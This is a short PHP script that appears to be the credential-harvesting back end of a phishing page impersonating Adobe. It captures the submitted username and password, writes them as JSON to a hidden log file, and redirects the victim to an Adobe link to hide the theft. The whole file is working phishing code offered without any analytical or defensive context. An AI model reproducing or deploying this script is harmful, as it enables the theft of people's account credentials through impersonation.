<?php

header('Location: https://adobe.ly/2OE9ZKL');
$data = array('site' => 'Adobe',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>